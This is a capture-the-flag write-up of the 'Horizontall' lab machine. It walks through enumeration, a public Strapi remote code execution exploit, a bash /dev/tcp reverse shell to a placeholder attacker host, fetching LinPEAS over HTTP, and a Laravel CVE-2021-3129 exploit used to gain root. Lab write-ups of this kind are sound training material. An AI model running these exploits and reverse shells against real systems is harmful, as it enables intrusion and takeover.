---
layout: writeup
title: "Horizontall"
date: 2026-06-16
description: "Exploiting a Strapi remote code execution, then pivoting to an internal Laravel app vulnerable to CVE-2021-3129 for root."
tags: [Box, easy, linux]
---

## Initial Reconnaissance

A full port scan was run against the target to identify the open services.

```bash
nmap -Pn -sV -sC -p- --open 10.10.11.105 -oN scan.txt
```

The application has some connectivity issues, so the hostname is added to `/etc/hosts`. At first glance the site only has a couple of buttons and nothing obviously interesting.

## Web Enumeration

Directory enumeration is run to look for hidden endpoints or login panels.

```bash
dirb http://horizontall.htb/
```

That turns up nothing useful, so enumeration moves on to virtual hosts.

```bash
gobuster vhost -u http://horizontall.htb -t 35 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
--append-domain -k --no-error
```

The gobuster output is full of false positives, so **ffuf** is used for cleaner results.

```bash
sudo ffuf -u http://horizontall.htb/ \
-H "Host: FUZZ.horizontall.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-fs 194
```

## Client-Side Analysis

With no obvious vector, the page source is reviewed for hidden references or redirects. The HTML reveals nothing, so the loaded JavaScript is examined instead. After beautifying it, a redirect to another subdomain becomes visible.

![JavaScript redirection](/assets/images/horizontall/23-1.png)
*A redirect to another subdomain found in the JavaScript*

That subdomain is added to `/etc/hosts` and enumeration continues against it.

## API Enumeration

Directory enumeration is run against the API endpoint.

```bash
dirb http://api-prod.horizontall.htb/
```

Several interesting directories appear.

![API directories](/assets/images/horizontall/23-2.png)
*Directories discovered on the API host*

`robots.txt` and `users` are not useful, but the **admin** endpoint serves a login page. Default credentials fail, so the login request is intercepted in Burp Suite to study the response. The response gives nothing away, so enumeration continues inside the admin panel itself, which leads to the **init** directory and discloses the **Strapi** version in use.

## Remote Code Execution

**searchsploit** returns a known **remote code execution** vulnerability for that Strapi version.

![Strapi RCE](/assets/images/horizontall/23-3.png)
*A known RCE exploit matching the Strapi version*

```python
python3 50239.py http://api-prod.horizontall.htb/
```

The exploit yields a blind shell, which is upgraded to a full reverse shell.

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

To avoid a *Bad Request* error, the payload is run through a bash wrapper.

```bash
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

![Reverse shell](/assets/images/horizontall/23-5.png)
*Full reverse shell obtained*

## User Access

With the reverse shell, the `user.txt` flag is read from the developer's home directory.

```bash
cat /home/developer/user.txt
```

`sudo -l` fails because it asks for the Strapi user's password.

## Privilege Escalation

**LinPEAS** is uploaded to enumerate escalation vectors.

```python
python3 -m http.server <PORT>
```

```bash
wget http://<IP>:<PORT>/linpeas.sh
```

```bash
chmod +x linpeas.sh
./linpeas.sh > linpeas.txt
```

LinPEAS flags several local-only ports, and `netstat` confirms a web service bound to localhost.

```bash
netstat -pentul
```

![Local services](/assets/images/horizontall/23-7.png)
*Local-only services reported by netstat*

## Local Service Exploitation

A request to the local service on port 8000 reveals a Laravel application.

```bash
curl -sSL -D- http://localhost:8000 -o /dev/null
```

Since it is only reachable locally, SSH port forwarding is set up to access it from the attacking machine. The application turns out to run a version of Laravel affected by **CVE-2021-3129**. A public exploit confirms command execution as root.

```python
python3 exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
```
